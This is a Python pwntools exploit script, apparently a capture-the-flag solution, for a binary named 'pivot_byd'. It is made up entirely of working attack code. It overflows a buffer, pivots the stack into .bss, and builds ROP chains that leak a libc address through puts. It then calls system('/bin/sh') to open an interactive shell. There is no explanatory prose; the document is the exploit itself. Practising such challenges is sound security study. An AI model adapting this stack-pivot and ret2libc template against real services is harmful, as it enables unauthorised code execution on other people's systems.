from pwn import *

context.log_level = 'debug'

# sh = gdb.debug("./pivot_byd")
sh = process("./pivot_byd")
elf = ELF("./pivot_byd")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

bss_data = 0x4040A0

read_bss = 0x401261
leave_ret = 0x40127c

pop_rdi = 0x401162  # pop rdi ; ret
pop_rsi = 0x401166  # pop rsi ; ret
pop_rdx = 0x401164  # pop rdx ; ret
ret = 0x401016

payload1 = b'a' * 0x20
payload1 += p64(bss_data + 0xA0)
payload1 += p64(leave_ret)

sh.sendafter("information:\n> ", payload1)

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
read_plt = elf.plt['read']
print("read_plt :" + str(hex(read_plt)))
read_got = elf.got['read']

payload2 = b'b' * 0xA0

payload2 += p64(bss_data + 0x100)
payload2 += p64(pop_rdi) + p64(read_got) + p64(puts_plt)
payload2 += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss_data+0x100) + p64(pop_rdx) + p64(0x300) + p64(read_plt)
payload2 += p64(leave_ret)
# gdb.attach(sh)

sh.sendafter("the flag\n> ", payload2)

libc_puts = libc.symbols['puts']
libc_read = libc.symbols['read']
libc_system = libc.symbols['system']
sh.recvuntil("Exit")
libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - libc_read
print(hex(libc_base))

system_addr = libc_base + libc_system

payload3 = p64(bss_data + 0x900)
payload3 += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss_data+0x900)  + p64(pop_rdx) + p64(0x300) + p64(read_plt)
payload3 += p64(leave_ret)

sh.send(payload3)

# gdb.attach(sh)
payload4 = b'd' * 8
payload4 += p64(pop_rdi)+ p64(bss_data+0x900+0x28)
payload4 += p64(ret)
payload4 += p64(system_addr)
payload4 += b'/bin/sh\x00'
sh.send(payload4)
sh.interactive()

